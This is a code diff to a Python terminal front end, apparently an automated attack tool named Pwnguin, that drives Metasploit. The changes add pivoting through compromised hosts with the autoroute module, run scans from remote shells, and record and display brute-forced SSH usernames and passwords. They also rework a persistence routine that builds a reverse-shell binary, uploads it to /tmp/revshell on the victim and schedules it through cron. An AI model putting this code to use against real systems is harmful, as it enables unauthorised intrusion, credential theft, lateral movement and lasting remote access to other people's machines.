@@ -95,7 +95,7 @@ default_payloads = [
 class Tile1(Static):
 
     def compose(self) -> ComposeResult:
-        yield OptionList("Scan computer", "Scan network", "Bruteforce SSH")
+        yield OptionList("Scan computer", "Scan network", "Bruteforce SSH", "Add route")
 
     def on_mount(self) -> None:
         self.border_title = "Action Type"
@@ -104,11 +104,13 @@ class Tile1(Static):
     def show_selected(self, event: OptionList.OptionHighlighted) -> None:
         input = self.parent.query_one("#command", Input)
         if event.option_index == 0:
-            input.placeholder = "Enter computer IP with mask (default: 127.0.0.1/8)"
+            input.placeholder = "Enter computer IP with mask (default: 127.0.0.1/8) (nmap must be installed on used machine)"
         elif event.option_index == 1:
-            input.placeholder = "Enter network with mask (default: 192.168.1.0/24)"
+            input.placeholder = "Enter network with mask (default: 192.168.1.0/24) (nmap must be installed on used machine)"
         elif event.option_index == 2:
-            input.placeholder = "Enter the target IP with mask to bruteforce ssh creds (only local) (default: 127.0.0.1/8)"
+            input.placeholder = "Enter the target IP with mask to bruteforce ssh creds (default: 127.0.0.1/8) (only local)"
+        elif event.option_index == 3:
+            input.placeholder = "[Network] via [IP] (ex: 10.0.2.0/24 via 192.168.155.244) (necessary to chain attacks)"
         STATE["action"] = event.option_index
 
     @on(OptionList.OptionSelected)
@@ -123,7 +125,9 @@ class Tile2(Static):
         yield Input(placeholder="command here", id="command")
 
     def on_mount(self) -> None:
-        self.border_title = "Input"
+        self.border_title = (
+            "Input (select machine used to scan on tree, nothing for local)"
+        )
 
     @on(Input.Submitted)
     def scan(self) -> None:
@@ -136,7 +140,6 @@ class Tile2(Static):
             if not re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$").match(
                 command
             ):
-                input.placeholder = "Wrong format (default: 127.0.0.1/8)"
                 return
             self.perform_computer_scan(command)
         elif STATE["action"] == 1:
@@ -145,7 +148,6 @@ class Tile2(Static):
             if not re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$").match(
                 command
             ):
-                input.placeholder = "Wrong format (default: 192.168.1.0/24)"
                 return
             # assure that the IP is a network ip
             command = str(ipaddress.ip_network(command, strict=False))
@@ -156,9 +158,14 @@ class Tile2(Static):
             if not re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$").match(
                 command
             ):
-                input.placeholder = "Wrong format (default: 127.0.0.1/8)"
                 return
             self.perform_bruteforce_ssh(command)
+        elif STATE["action"] == 3:
+            if not re.compile(
+                r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2} via (?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
+            ).match(command):
+                return
+            self.add_route(command.split(" ")[0], command.split(" ")[2])
         input.placeholder = "let's go !"
         pretty = self.parent.query_one("#logs", Pretty)
         pretty.update("Scanning " + command)
@@ -166,7 +173,24 @@ class Tile2(Static):
     @work(exclusive=True, thread=True)
     def perform_computer_scan(self, ip: str) -> None:
         try:
-            result = autopwn.scanIp4Vulnerabilities(ip=ip.split("/")[0])
+            scan_from = STATE["IP"]
+            computer = STATE["computers"].get(scan_from)
+            if computer and not computer.is_local:
+                # scan on remote machine
+                shellid = autopwn.findShellID(STATE["client"], scan_from.split("/")[0])
+                if shellid:
+                    shell = autopwn.getShell(STATE["client"], shellid)
+                    result = autopwn.scanIp4Vulnerabilities(
+                        ip=ip.split("/")[0], shell=shell
+                    )
+                else:
+                    self.app.call_from_thread(
+                        self.parent.query_one("#logs", Pretty).update,
+                        "Can't launch scan from this remote machine",
+                    )
+                    return
+            else:
+                result = autopwn.scanIp4Vulnerabilities(ip=ip.split("/")[0])
         except:
             self.app.call_from_thread(
                 self.parent.query_one("#logs", Pretty).update, "The host doesn't exist"
@@ -191,9 +215,24 @@ class Tile2(Static):
 
     @work(exclusive=True, thread=True)
     def perform_network_scan(self, ip: str) -> None:
-        mask = ip.split("/")[1]
-        result = postexploit.scanNetwork(ip)
+        scan_from = STATE["IP"]
+        computer = STATE["computers"].get(scan_from)
+        if computer and not computer.is_local:
+            # scan on remote machine
+            shellid = autopwn.findShellID(STATE["client"], scan_from.split("/")[0])
+            if shellid:
+                shell = autopwn.getShell(STATE["client"], shellid)
+                result = postexploit.scanNetwork(ip, shell=shell)
+            else:
+                self.app.call_from_thread(
+                    self.parent.query_one("#logs", Pretty).update,
+                    "Can't launch scan from this remote machine",
+                )
+                return
+        else:
+            result = postexploit.scanNetwork(ip)
         self.app.call_from_thread(self.parent.query_one("#logs", Pretty).update, result)
+        mask = ip.split("/")[1]
         for ip in result:
             full_ip = ip + "/" + mask
             if full_ip not in STATE["computers"]:
@@ -212,6 +251,8 @@ class Tile2(Static):
                 "No credentials found for the target",
             )
             return
+        else:
+            STATE["computers"][ip].credentials.append({"usr": usr, "pwd": pwd})
         client: MsfRpcClient = STATE["client"]
         exploit = client.modules.use("auxiliary", "scanner/ssh/ssh_login")
         exploit["USERNAME"] = usr
@@ -225,6 +266,21 @@ class Tile2(Static):
         )
         self.app.call_from_thread(
             self.app.query_one(ParamMenu).launch_attack, STATE["IP"], True
+        )
+
+    @work(exclusive=True, thread=True)
+    def add_route(self, network: str, ip: str) -> None:
+        client: MsfRpcClient = STATE["client"]
+        autoroute = client.modules.use("post", "multi/manage/autoroute")
+        shell_id = autopwn.findShellID(client, ip)
+        autoroute["SESSION"] = shell_id
+        autoroute["SUBNET"] = network
+        job = autoroute.execute()
+        while len(client.jobs.list) != 0:
+            sleep(0.1)
+        self.app.call_from_thread(
+            self.parent.query_one("#logs", Pretty).update,
+            f"Added autoroute for {network} via {ip}",
         )
 
 
@@ -257,6 +313,9 @@ class Tile4(Static):
         for network in networks:
             network_node = self.tree.root.add(network, expand=True)
             for host in networks[network]:
+                ip = host + "/" + network.split("/")[1]
+                if ip not in STATE["computers"]:
+                    STATE["computers"][ip] = Computer()
                 network_node.add_leaf(host)
 
     @on(Tree.NodeSelected)
@@ -339,6 +398,9 @@ class ComputerInfos(Static):
             s += "connected: no - backup infos\n"
         s += "##### Machine distribution\n"
         s += computer.os
+        s += "\n\n##### User/Passwords"
+        for cred in computer.credentials:
+            s += f"\n - {cred['usr']}:{cred['pwd']}"
         s += "\n\n##### Interfaces"
         for inter in computer.networks:
             s += f"\n - {inter['iface']}: {inter['network']}"
@@ -480,9 +542,8 @@ class ParamMenu(Static):
         exploit = STATE["exploit_ms"]
         payload = STATE["payload_ms"]
         job = exploit.execute(payload=payload)
-        print(job)
         while len(client.jobs.list) != 0:
-            pass
+            sleep(0.1)
         new_sessions = client.sessions.list
         new_sess_id = [
             element for element in new_sessions if element not in STATE["sessions"]
@@ -513,18 +574,19 @@ class ParamMenu(Static):
         # persistence
         if persistence:
             persistence_port = rng.randint(5000, 65535)
-            shell.write("upload ./post/vir/revshell /tmp/revshell")
-            sleep(2)
-            shell.write("shell")
-            sleep(1)
             self.app.call_from_thread(
                 self.app.query_one("#logs", Pretty).update,
-                "Setting up persistence on the machine via cron job...",
+                f"Setting up persistence on the machine via cron job on port {persistence_port}...",
             )
             subprocess.run(
                 f"./post/shellgen.sh {ip_source_attack.split('/')[0]} {persistence_port} elf",
                 shell=True,
             )
+            sleep(1)
+            shell.write("upload ./post/vir/revshell /tmp/revshell")
+            sleep(2)
+            shell.write("shell")
+            sleep(1)
             shell.write("chmod +x /tmp/revshell")
             sleep(1)
             shell.write(
@@ -729,7 +791,7 @@ class SequencesMenu(Static):
 class Tile5(Static):
     def compose(self) -> ComposeResult:
         with TabbedContent():
-            with TabPane("Connections", id="computer_tab"):
+            with TabPane("Infos", id="computer_tab"):
                 yield ComputerInfos()
             with TabPane("Vulnerabilities", id="vuln_tab"):
                 yield VulnChoice()
@@ -819,7 +881,7 @@ class Pwnguin(App):
                     paramMenu.launch_attack, action_l[3], False
                 )
                 while task.is_running:
-                    pass
+                    sleep(0.1)
             else:
                 self.call_from_thread(logs.update, "adding route to" + action_l[1])
                 autoroute["SUBNET"] = action_l[1]
@@ -829,7 +891,6 @@ class Pwnguin(App):
                     autopwn.findShellID(client, action_l[3].split("/")[0])
                 )
                 job = autoroute.execute()
-                print(job)
                 sleep(2)
 
         self.app.call_from_thread(self.end_init)
